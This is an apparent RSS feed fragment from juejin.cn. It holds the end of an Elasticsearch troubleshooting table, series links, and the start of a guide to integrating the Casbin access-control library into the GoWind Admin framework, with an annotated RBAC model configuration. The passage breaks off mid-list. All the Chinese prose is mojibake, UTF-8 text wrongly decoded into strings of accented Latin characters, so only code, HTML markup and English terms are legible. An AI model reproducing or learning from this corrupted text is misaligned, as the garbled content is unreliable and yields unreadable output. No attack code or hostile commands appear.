ç«‹åˆ»å¤±è´¥</td><td>å¯¹â€œåªå†™å…¥ä¸åˆ†æâ€çš„å­—æ®µæ‰å…³ï¼›è‹¥çº¿ä¸Šå·²å…³ä¸”å¿…é¡»æ¢å¤ï¼Œé€šå¸¸éœ€è¦æ–°ç´¢å¼•é‡å»ºï¼ˆä¾èµ–å…·ä½“å­—æ®µä¸ç‰ˆæœ¬é™åˆ¶ï¼‰</td></tr><tr><td>èšåˆ/æ’åºå»¶è¿ŸæŠ–åŠ¨ï¼ŒCPU/IO å¼‚å¸¸</td><td><code>working set</code> å¤§ã€å†·çƒ­ä¸å‡ï¼›æŠŠ <code>text</code> å¼€ <code>fielddata</code> å¯¼è‡´å †å‹åŠ›</td><td>çœ‹ JVM å †ã€GCã€çƒ­å­—æ®µï¼›ç¡®è®¤æ˜¯å¦å¯ç”¨ <code>fielddata</code></td><td>ä¼˜å…ˆç”¨ <code>doc values</code>ï¼ˆ<code>keyword/numeric/date</code>ï¼‰ï¼›é¿å…åœ¨ <code>text</code> ä¸Šå¯ <code>fielddata</code>ï¼›å¿…è¦æ—¶åšå­—æ®µé™ç»´/åˆ†æ¡¶/é¢„èšåˆ</td></tr></tbody></table>
<h2 data-id="heading-12">å…¶ä»–ç³»åˆ—</h2>
<h3 data-id="heading-13">ğŸš€ AIç¯‡æŒç»­æ›´æ–°ä¸­ï¼ˆé•¿æœŸæ›´æ–°ï¼‰</h3>
<p><strong>AIç‚¼ä¸¹æ—¥å¿—-29 - å­—èŠ‚è·³åŠ¨ DeerFlow æ·±åº¦ç ”ç©¶æ¡†<em>æ–œä½“æ ·å¼</em>æ¶ ç§æœ‰éƒ¨ç½² æµ‹è¯•ä¸Šæ‰‹ æ¶æ„ç ”ç©¶</strong>ï¼ŒæŒç»­æ‰“é€ å®ç”¨AIå·¥å…·æŒ‡å—ï¼
<strong>AIç ”ç©¶-132 Java ç”Ÿæ€å‰æ²¿ 2025ï¼šSpringã€Quarkusã€GraalVMã€CRaC ä¸äº‘åŸç”Ÿè½åœ°</strong></p>
<h3 data-id="heading-14">ğŸ’» Javaç¯‡æŒç»­æ›´æ–°ä¸­ï¼ˆé•¿æœŸæ›´æ–°ï¼‰</h3>
<p><strong>Java-196 æ¶ˆæ¯é˜Ÿåˆ—é€‰å‹ï¼šRabbitMQ vs RocketMQ vs Kafka</strong>
MyBatis å·²å®Œç»“ï¼ŒSpring å·²å®Œç»“ï¼ŒNginxå·²å®Œç»“ï¼ŒTomcatå·²å®Œç»“ï¼Œåˆ†å¸ƒå¼æœåŠ¡å·²å®Œç»“ï¼ŒDubboå·²å®Œç»“ï¼ŒMySQLå·²å®Œç»“ï¼ŒMongoDBå·²å®Œç»“ï¼ŒNeo4jå·²å®Œç»“ï¼ŒFastDFS å·²å®Œç»“ï¼ŒOSSå·²å®Œç»“ï¼ŒGuavaCacheå·²å®Œç»“ï¼ŒEVCacheå·²å®Œç»“ï¼ŒRabbitMQæ­£åœ¨æ›´æ–°... æ·±å…¥æµ…å‡ºåŠ©ä½ æ‰“ç‰¢åŸºç¡€ï¼</p>
<h3 data-id="heading-15">ğŸ“Š å¤§æ•°æ®æ¿å—å·²å®Œæˆå¤šé¡¹å¹²è´§æ›´æ–°ï¼ˆ300ç¯‡ï¼‰ï¼š</h3>
<p>åŒ…æ‹¬ Hadoopã€Hiveã€Kafkaã€Flinkã€ClickHouseã€Elasticsearch ç­‰äºŒåä½™é¡¹æ ¸å¿ƒç»„ä»¶ï¼Œè¦†ç›–ç¦»çº¿+å®æ—¶æ•°ä»“å…¨æ ˆï¼
<strong>å¤§æ•°æ®-278 Spark MLib - åŸºç¡€ä»‹ç» æœºå™¨å­¦ä¹ ç®—æ³• æ¢¯åº¦æå‡æ ‘ GBDTæ¡ˆä¾‹ è¯¦è§£</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¼€ç®±å³ç”¨çš„ GoWind Adminï½œé£è¡Œï¼Œä¼ä¸šçº§å‰åç«¯ä¸€ä½“ä¸­åå°æ¡†æ¶ï¼šCasbiné›†æˆæŒ‡å—]]></title>    <link>https://juejin.cn/post/7583906870827433993</link>    <guid>https://juejin.cn/post/7583906870827433993</guid>    <pubDate>2025-12-15T10:19:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583906870827433993" data-draft-id="7583878719543705609" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¼€ç®±å³ç”¨çš„ GoWind Adminï½œé£è¡Œï¼Œä¼ä¸šçº§å‰åç«¯ä¸€ä½“ä¸­åå°æ¡†æ¶ï¼šCasbiné›†æˆæŒ‡å—"/> <meta itemprop="keywords" content="åç«¯,Go"/> <meta itemprop="datePublished" content="2025-12-15T10:19:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å–µä¸ªå’ª"/> <meta itemprop="url" content="https://juejin.cn/user/1350630784901262"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¼€ç®±å³ç”¨çš„ GoWind Adminï½œé£è¡Œï¼Œä¼ä¸šçº§å‰åç«¯ä¸€ä½“ä¸­åå°æ¡†æ¶ï¼šCasbiné›†æˆæŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1350630784901262/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å–µä¸ªå’ª
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T10:19:38.000Z" title="Mon Dec 15 2025 10:19:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼€ç®±å³ç”¨çš„ GoWind Adminï½œé£è¡Œï¼Œä¼ä¸šçº§å‰åç«¯ä¸€ä½“ä¸­åå°æ¡†æ¶ï¼šCasbiné›†æˆæŒ‡å—</h2>
<p>GoWind Adminï¼ˆé£è¡Œï¼‰ä½œä¸ºå¼€ç®±å³ç”¨çš„ä¼ä¸šçº§å‰åç«¯ä¸€ä½“ä¸­åå°æ¡†æ¶ï¼Œè‡´åŠ›äºè§£å†³ä¸­åå°ç³»ç»Ÿå¼€å‘ä¸­çš„é€šç”¨é—®é¢˜ï¼Œè€Œæƒé™ç®¡ç†ä½œä¸ºä¸­åå°ç³»ç»Ÿçš„æ ¸å¿ƒå®‰å…¨èƒ½åŠ›ï¼Œæ˜¯æ¡†æ¶è®¾è®¡çš„é‡ä¸­ä¹‹é‡ã€‚Casbin ä½œä¸ºä¸€æ¬¾åŠŸèƒ½å¼ºå¤§ã€çµæ´»æ˜“ç”¨çš„å¼€æºè®¿é—®æ§åˆ¶æ¡†æ¶ï¼Œèƒ½å¤Ÿå®Œç¾é€‚é… GoWind Admin çš„æƒé™ç®¡ç†éœ€æ±‚ã€‚æœ¬æ–‡å°†è¯¦ç»†è®²è§£ Casbin çš„æ ¸å¿ƒåŸç†ã€é…ç½®è§„åˆ™ï¼Œå¹¶å®Œæ•´å‘ˆç°å…¶åœ¨ GoWind Admin ä¸­çš„é›†æˆæµç¨‹ä¸æœ€ä½³å®è·µã€‚</p>
<h3 data-id="heading-1">ä¸€ã€Casbin ç®€ä»‹ï¼šä¼ä¸šçº§æƒé™ç®¡ç†çš„ä¼˜é€‰æ–¹æ¡ˆ</h3>
<p>Casbinï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcasbin%2Fcasbin" target="_blank" title="https://github.com/casbin/casbin" ref="nofollow noopener noreferrer">github.com/casbin/casbâ€¦</a>ï¼‰æ˜¯ä¸€æ¬¾ä¸“æ³¨äºè®¿é—®æ§åˆ¶çš„å¼€æºåº“ï¼Œæ ¸å¿ƒç›®æ ‡æ˜¯å¸®åŠ©å¤æ‚ç³»ç»Ÿè§£å†³æƒé™ç®¡ç†çš„çµæ´»æ€§ä¸å®‰å…¨æ€§éš¾é¢˜ï¼Œä¹Ÿæ˜¯å›½å†…å¼€æºé¡¹ç›®ä¸­çš„ä¼˜ç§€ä»£è¡¨ã€‚å…¶æœ€å¤§ä¼˜åŠ¿åœ¨äºé‡‡ç”¨<strong>å…ƒæ¨¡å‹è®¾è®¡æ€æƒ³</strong>ï¼Œä¸å±€é™äºå›ºå®šçš„æƒé™æ¨¡å‹ï¼Œè€Œæ˜¯æ”¯æŒ ACLï¼ˆè®¿é—®æ§åˆ¶åˆ—è¡¨ï¼‰ã€RBACï¼ˆåŸºäºè§’è‰²è®¿é—®æ§åˆ¶ï¼‰ã€ABACï¼ˆåŸºäºå±æ€§è®¿é—®æ§åˆ¶ï¼‰ã€RESTful ç­‰å¤šç§ç»å…¸è®¿é—®æ§åˆ¶æ¨¡å‹ï¼ŒåŒæ—¶å…è®¸å¼€å‘è€…æ ¹æ®ä¸šåŠ¡éœ€æ±‚è‡ªå®šä¹‰æƒé™è§„åˆ™ï¼Œå…·å¤‡æå¼ºçš„æ‰©å±•æ€§ã€‚
å‡­å€Ÿå“è¶Šçš„è®¾è®¡ä¸ç¨³å®šæ€§ï¼ŒCasbin å·²è·å¾—å…¨çƒä¼—å¤šä¼ä¸šçš„è®¤å¯ï¼šIntelã€IBMã€è…¾è®¯äº‘ã€VMwareã€RedHatã€T-Mobile ç­‰ä¼ä¸šå°†å…¶ç”¨äºå¼€æºé¡¹ç›®ï¼ŒCiscoã€Verizon ç­‰ä¼ä¸šåœ¨é—­æºç³»ç»Ÿä¸­é‡‡ç”¨ã€‚é¡¹ç›®ç”±åŒ—äº¬å¤§å­¦ç½—æ¨åšå£«äº 2017 å¹´ 4 æœˆå‘èµ·ï¼Œç½—æ¨åšå£«é•¿æœŸæ·±è€•äº‘è®¡ç®—è®¿é—®æ§åˆ¶é¢†åŸŸï¼Œå‘è¡¨æ•°åç¯‡ç›¸å…³å­¦æœ¯è®ºæ–‡ï¼Œå¹¶åœ¨ ICWSã€IEEE CLOUDã€ICICS ç­‰é¡¶çº§å­¦æœ¯ä¼šè®®å®£è®²ç ”ç©¶æˆæœï¼ŒCasbin æ­£æ˜¯å…¶å­¦æœ¯ç ”ç©¶ä¸å·¥ç¨‹å®è·µç»“åˆçš„æ ¸å¿ƒäº§ç‰©ã€‚</p>
<p>Casbin æœ€åˆåŸºäº Go è¯­è¨€å¼€å‘ï¼Œç›®å‰å·²æ‰©å±•è‡³ Javaã€Node.jsã€Javascript(React)ã€Pythonã€PHPã€.NETã€Delphiã€Rust ç­‰å¤šç§è¯­è¨€ï¼Œä¸»é¡¹ç›®åœ¨ GitHub ä¸Šå·²ç§¯ç´¯ 1.3w+ Starsï¼Œæ‹¥æœ‰ä¸Šç™¾äººçš„ç¨³å®šç»´æŠ¤å›¢é˜Ÿï¼ŒæŒç»­è¿­ä»£ä¼˜åŒ–ï¼Œç”Ÿæ€æ—¥è¶‹å®Œå–„ã€‚</p>
<h3 data-id="heading-2">äºŒã€æ·±å…¥ç†è§£ Casbin æ ¸å¿ƒæœºåˆ¶</h3>
<p>Casbin çš„æƒé™åˆ¤å®šé€»è¾‘å¯æ¦‚æ‹¬ä¸ºã€Œæ ¹æ®é¢„è®¾è§„åˆ™ï¼Œæ ¡éªŒè®¿é—®è¯·æ±‚æ˜¯å¦åˆæ³•ã€ï¼Œå…¶æ ¸å¿ƒç”±ä¸‰å¤§æ¦‚å¿µæ„æˆï¼Œä¸‰è€…ååŒå®Œæˆæƒé™åˆ¤å®šï¼Œåœ¨ Casbin å®˜æ–¹æä¾›çš„ <a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">äº¤äº’å¼è§£é‡Šå™¨</a> ä¸­å¯ç›´è§‚æŸ¥çœ‹è¿è¡Œè¿‡ç¨‹ï¼ˆè¯¥å·¥å…·æ”¯æŒåœ¨çº¿æµ‹è¯•æ¨¡å‹ä¸ç­–ç•¥ï¼Œæ˜¯å­¦ä¹ ä¸è°ƒè¯•çš„å¿…å¤‡å·¥å…·ï¼‰ã€‚</p>
<h4 data-id="heading-3">2.1 ä¸‰å¤§æ ¸å¿ƒæ¦‚å¿µï¼ˆå®è§‚è§†è§’ï¼‰</h4>
<ol>
<li><strong>è¯·æ±‚ï¼ˆRequestï¼‰</strong>ï¼šç”¨æˆ·å‘èµ·çš„è®¿é—®ç”³è¯·ï¼Œå³ã€Œè°ï¼ˆç”¨æˆ·ï¼‰æƒ³å¯¹ä»€ä¹ˆï¼ˆèµ„æºï¼‰åšä»€ä¹ˆï¼ˆæ“ä½œï¼‰ã€ã€‚</li>
<li><strong>æ¨¡å‹ï¼ˆModelï¼‰</strong>ï¼šæƒé™åˆ¤å®šçš„è§„åˆ™æ¨¡æ¿ï¼Œå®šä¹‰äº†ã€Œå¦‚ä½•åˆ¤æ–­è¯·æ±‚æ˜¯å¦åˆæ³•ã€ï¼Œç›¸å½“äºæƒé™ç³»ç»Ÿçš„ã€Œåˆ¤å®šæ‰‹å†Œã€ã€‚</li>
<li><strong>ç­–ç•¥ï¼ˆPolicyï¼‰</strong>ï¼šå…·ä½“çš„æƒé™åˆ†é…æ•°æ®ï¼Œå®šä¹‰äº†ã€Œè°æ‹¥æœ‰å¯¹ä»€ä¹ˆèµ„æºçš„ä»€ä¹ˆæ“ä½œæƒé™ã€ï¼Œç›¸å½“äºæƒé™ç³»ç»Ÿçš„ã€Œæƒé™æ¸…å•ã€ã€‚</li>
</ol>
<p>ä¸¾ä¸ªé€šä¿—ç¤ºä¾‹ï¼šç”¨æˆ· Bob å‘èµ· HTTP GET è¯·æ±‚è®¿é—® <code>/users</code> æ¥å£ï¼ˆè¯·æ±‚ï¼‰ï¼›ç³»ç»Ÿé‡‡ç”¨ RBAC æ¨¡å‹ï¼Œè§„åˆ™å®šä¹‰ä¸ºã€Œè¶…çº§ç”¨æˆ·å¯è®¿é—®æ‰€æœ‰èµ„æºã€ï¼ˆæ¨¡å‹ï¼‰ï¼›ç­–ç•¥ä¸­æ˜ç¡®ã€ŒBob å±äºè¶…çº§ç”¨æˆ·è§’è‰²ã€ï¼ˆç­–ç•¥ï¼‰ã€‚Casbin ä¾æ®æ¨¡å‹è§„åˆ™æ ¡éªŒè¯·æ±‚ä¸ç­–ç•¥çš„åŒ¹é…å…³ç³»ï¼Œæœ€ç»ˆåˆ¤å®š Bob æœ‰æƒè®¿é—®è¯¥æ¥å£ã€‚</p>
<h4 data-id="heading-4">2.2 è¯·æ±‚çš„æ ¸å¿ƒæ„æˆï¼ˆå¾®è§‚è§†è§’ï¼‰</h4>
<p>ä»»ä½•æƒé™è¯·æ±‚éƒ½å¯æŠ½è±¡ä¸ºä¸€ä¸ªã€Œä¸‰å…ƒç»„ã€ï¼ˆåŸºç¡€æ¬¾ï¼‰ï¼Œå¤æ‚åœºæ™¯å¯æ‰©å±•ä¸ºã€Œå››å…ƒç»„ã€ï¼ˆå¢åŠ åŸŸ/ç§Ÿæˆ·ç»´åº¦ï¼‰ï¼š</p>
<ol>
<li><strong>è®¿é—®å®ä½“ï¼ˆSubjectï¼‰</strong>ï¼šå‘èµ·è®¿é—®çš„ä¸»ä½“ï¼Œé€šå¸¸æ˜¯ç”¨æˆ·ã€è§’è‰²ã€æœåŠ¡è´¦å·ç­‰ã€‚</li>
<li><strong>è®¿é—®èµ„æºï¼ˆObjectï¼‰</strong>ï¼šè¢«è®¿é—®çš„ç›®æ ‡ï¼Œå¦‚æ¥å£è·¯å¾„ã€æ•°æ®åº“è¡¨ã€æ–‡ä»¶è·¯å¾„ç­‰ã€‚</li>
<li><strong>è®¿é—®æ–¹æ³•ï¼ˆActionï¼‰</strong>ï¼šå¯¹èµ„æºæ‰§è¡Œçš„æ“ä½œï¼Œå¦‚ HTTP æ–¹æ³•ï¼ˆGET/POST/PUT/DELETEï¼‰ã€æ•°æ®åº“æ“ä½œï¼ˆå¢åˆ æ”¹æŸ¥ï¼‰ç­‰ã€‚</li>
<li><strong>è®¿é—®åŸŸï¼ˆDomainï¼‰</strong>ï¼šå¯é€‰ç»´åº¦ï¼Œç”¨äºå¤šç§Ÿæˆ·/å¤šç»„ç»‡åœºæ™¯ï¼ŒåŒºåˆ†ä¸åŒåŸŸä¸‹çš„èµ„æºæƒé™ã€‚</li>
</ol>
<p>Casbin é€šè¿‡ <code>Enforcer.Enforce</code> æ–¹æ³•æ¥æ”¶ä¸Šè¿°å‚æ•°å¹¶æ‰§è¡Œåˆ¤å®šï¼Œä¾‹å¦‚ä¸Šè¿°ç¤ºä¾‹çš„è°ƒç”¨å½¢å¼ä¸ºï¼š<code>Enforcer.Enforce("Bob", "/users", "GET")</code>ã€‚</p>
<h3 data-id="heading-5">ä¸‰ã€Casbin æ ¸å¿ƒé…ç½®è§£æ</h3>
<p>Casbin çš„è¿è¡Œä¾èµ–ã€Œæ¨¡å‹ã€ä¸ã€Œç­–ç•¥ã€ä¸¤å¤§é…ç½®ï¼šæ¨¡å‹å®šä¹‰æƒé™åˆ¤å®šçš„è§„åˆ™æ¨¡æ¿ï¼ˆé™æ€é…ç½®ï¼Œä¸€èˆ¬ä¸å¸¸å˜åŠ¨ï¼‰ï¼Œç­–ç•¥å®šä¹‰å…·ä½“çš„æƒé™åˆ†é…ï¼ˆåŠ¨æ€é…ç½®ï¼Œéœ€æ ¹æ®ä¸šåŠ¡åœºæ™¯åŠ¨æ€æ›´æ–°ï¼Œé€šå¸¸æŒä¹…åŒ–åˆ°æ•°æ®åº“ï¼‰ã€‚</p>
<h4 data-id="heading-6">3.1 æ¨¡å‹é…ç½®ï¼ˆAccess Control Modelï¼‰</h4>
<p>æ¨¡å‹é€šè¿‡é…ç½®æ–‡ä»¶å®šä¹‰ï¼Œé‡‡ç”¨ INI æ ¼å¼ï¼Œæ ¸å¿ƒåŒ…å«äº”éƒ¨åˆ†ï¼ˆå…¶ä¸­è§’è‰²å®šä¹‰ä¸º RBAC æ¨¡å‹ä¸“ç”¨ï¼Œå¯é€‰ï¼‰ã€‚ä¸‹é¢ä»¥ GoWind Admin é»˜è®¤é›†æˆçš„ RBAC æ¨¡å‹ä¸ºä¾‹ï¼Œé€éƒ¨åˆ†è§£æï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># è¯·æ±‚å®šä¹‰ï¼šæŒ‡å®š Enforce æ–¹æ³•çš„å‚æ•°é¡ºåºä¸åç§°</span>
<span class="hljs-section">[request_definition]</span>
<span class="hljs-attr">r</span> = sub, obj, act, dom  <span class="hljs-comment"># å››å…ƒç»„ï¼šä¸»ä½“ã€èµ„æºã€æ“ä½œã€åŸŸ</span>

<span class="hljs-comment"># ç­–ç•¥å®šä¹‰ï¼šæŒ‡å®šæƒé™è§„åˆ™çš„å­—æ®µé¡ºåºä¸åç§°</span>
<span class="hljs-section">[policy_definition]</span>
<span class="hljs-attr">p</span> = sub, obj, act, dom  <span class="hljs-comment"># ä¸è¯·æ±‚å®šä¹‰å¯¹åº”ï¼Œå¯å¢åŠ  eftï¼ˆallow/denyï¼‰å­—æ®µæŒ‡å®šæƒé™ç±»å‹</span>

<span class="hljs-comment"># è§’è‰²å®šä¹‰ï¼šRBAC æ¨¡å‹ä¸“ç”¨ï¼Œå®šä¹‰ç”¨æˆ·ä¸è§’è‰²çš„æ˜ å°„å…³ç³»</span>
<span class="hljs-section">[role_definition]</span>
<span class="hljs-attr">g</span> = _, _, _  <span class="hljs-comment"># å‰ä¸¤ä¸ªå‚æ•°ï¼šç”¨æˆ·â†’è§’è‰²ï¼›ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šåŸŸï¼ˆå¯é€‰ï¼Œå¤šç§Ÿæˆ·åœºæ™¯ï¼‰</span>

<span class="hljs-comment"># ç­–ç•¥æ•ˆæœï¼šå®šä¹‰å¤šä¸ªåŒ¹é…è§„åˆ™çš„ç»„åˆé€»è¾‘</span>
<span class="hljs-section">[policy_effect]</span>
<span class="hljs-attr">e</span> = some(where (p.eft == allow))  <span class="hljs-comment"># å­˜åœ¨ä»»æ„ä¸€æ¡å…è®¸è§„åˆ™å³åˆ¤å®šä¸ºé€šè¿‡</span>

<span class="hljs-comment"># åŒ¹é…å™¨å®šä¹‰ï¼šå®šä¹‰è¯·æ±‚ä¸ç­–ç•¥çš„åŒ¹é…è§„åˆ™</span>
<span class="hljs-section">[matchers]</span>
<span class="hljs-attr">m</span> = g(r.sub, p.sub, r.dom) &amp;&amp; keyMatch2(r.obj, p.obj) &amp;&amp; (regexMatch(r.act, p.act) || p.act == <span class="hljs-string">'ANY'</span>) &amp;&amp; (keyMatch(r.dom, p.dom) || p.dom == <span class="hljs-string">'*'</span>)
<span class="hljs-comment"># è§£æï¼šç”¨æˆ·è§’è‰²åŒ¹é… &amp;&amp; èµ„æºè·¯å¾„åŒ¹é…ï¼ˆæ”¯æŒé€šé…ç¬¦ï¼‰ &amp;&amp; æ“ä½œåŒ¹é…ï¼ˆæ”¯æŒæ­£åˆ™/ä»»æ„æ“ä½œï¼‰ &amp;&amp; åŸŸåŒ¹é…ï¼ˆæ”¯æŒé€šé…ç¬¦/ä»»æ„åŸŸï¼‰</span>
</code></pre>
<h4 data-id="heading-7">3.1.1 å„éƒ¨åˆ†è¯¦ç»†è¯´æ˜</h4>
<ol>
<li><strong>è¯·æ±‚å®šä¹‰ï¼ˆRequest Definitionï¼‰</strong> ç”¨äºç»‘å®š <code>Enforcer.Enforce</code> æ–¹æ³•çš„å…¥å‚ï¼Œæ ¼å¼ä¸º <code>r = å‚æ•°1, å‚æ•°2, ...</code>ã€‚åŸºç¡€åœºæ™¯ç”¨ä¸‰å…ƒç»„ï¼ˆsub, obj, actï¼‰ï¼Œå¤šç§Ÿæˆ·åœºæ™¯éœ€å¢åŠ  domï¼ˆåŸŸï¼‰å‚æ•°ï¼Œå½¢æˆå››å…ƒç»„ã€‚ç¤ºä¾‹ï¼ˆåŸºç¡€ä¸‰å…ƒç»„ï¼‰ï¼š<code>r = sub, obj, act</code></li>
<li><strong>ç­–ç•¥å®šä¹‰ï¼ˆPolicy Definitionï¼‰</strong> å®šä¹‰æƒé™è§„åˆ™çš„å­—æ®µç»“æ„ï¼Œæ ¼å¼ä¸º <code>p = å­—æ®µ1, å­—æ®µ2, ...</code>ï¼Œå­—æ®µé¡ºåºéœ€ä¸è¯·æ±‚å®šä¹‰å¯¹åº”ã€‚å¯é€‰å¢åŠ  <code>eft</code> å­—æ®µï¼ˆå–å€¼ä¸º allow/denyï¼‰ï¼Œç”¨äºæ˜ç¡®è§„åˆ™æ˜¯ã€Œå…è®¸ã€è¿˜æ˜¯ã€Œæ‹’ç»ã€ï¼ˆé»˜è®¤ä¸º allowï¼‰ã€‚ç¤ºä¾‹ï¼ˆå« eft å­—æ®µï¼‰ï¼š<code>p = eft, sub, obj, act</code></li>
<li><strong>åŒ¹é…å™¨å®šä¹‰ï¼ˆMatcherï¼‰</strong> æ ¸å¿ƒè§„åˆ™ï¼Œå®šä¹‰è¯·æ±‚ï¼ˆrï¼‰ä¸ç­–ç•¥ï¼ˆpï¼‰çš„åŒ¹é…é€»è¾‘ï¼Œæ”¯æŒå¤šç§å†…ç½®å‡½æ•°ï¼š<code>g(r.sub, p.sub)</code>ï¼šæ ¡éªŒç”¨æˆ·ï¼ˆr.subï¼‰æ˜¯å¦æ‹¥æœ‰ç­–ç•¥ä¸­çš„è§’è‰²ï¼ˆp.subï¼‰ï¼›</li>
<li><code>keyMatch2(r.obj, p.obj)</code>ï¼šæ”¯æŒè·¯å¾„é€šé…ç¬¦åŒ¹é…ï¼ˆå¦‚ <code>/user/:id</code> å¯åŒ¹é… <code>/user/123</code>ï¼‰ï¼›</li>
